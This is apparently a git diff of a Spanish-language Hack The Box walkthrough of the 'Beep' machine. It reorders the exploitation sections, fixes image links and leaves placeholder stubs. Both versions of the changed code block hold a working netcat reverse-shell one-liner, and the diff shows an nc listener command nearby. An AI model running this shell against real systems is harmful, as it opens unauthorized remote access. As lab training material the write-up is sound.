@@ -113,7 +113,7 @@ Una vez dentro, lo primero que vemos es un panel que nos pide autenticar para te
 
 ### [](#header-3)Fase De Explotación
 
-Como mencioné en un inicio, la máquina _Beep_ cuenta con varios vectores para realizar la fase de explotación; de hecho, para dos de ellos ni siquiera hace falta la escalada de privilegios.
+Como mencioné en un inicio, la máquina _Beep_ cuenta con varios vectores para realizar la fase de explotación; de hecho, para tres de ellos ni siquiera hace falta la escalada de privilegios.
 
 ### [](#header-4)Fase De Explotación - Local File Inclusion
 
@@ -175,7 +175,7 @@ Al habernos conectado a la máquina directamente como root, no es necesario real
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/17.png)
 
-### [](#header-4)Fase De Explotación - Shellshock
+### [](#header-4)Fase De Explotación - Webmin
 
 [shellshock](https://mateonitro550.github.io/Shellshock)
 
@@ -196,22 +196,26 @@ sudo nc -nlvp <puertoCualquiera>
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/19.png)
 
 ```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <direcciónIP> <puertoCualquiera> >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <nuestraIP> <puertoCualquiera> >/tmp/f
 ```
-[](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/20.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/20.png)
 
 Después de darle a `save`, y habiendo pasado el tiempo que hayamos programado, conseguiremos una shell como el usuario root, por lo que nuevamente, no hizo falta la escalada de privilegios.
 
-[](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/21.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/21.png)
 
 De modo que podremos leer sin problema alguno tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios.
 
-[](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/22.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/22.png)
+
+### [](#header-4)Fase De Explotación - Shellshock
+
+ABC
 
 ### [](#header-4)Fase De Explotación - File Upload Bypass
 
-GHI
+DEF
 
 ### [](#header-3)Escalada De Privilegios
 
-JKL
+GHI
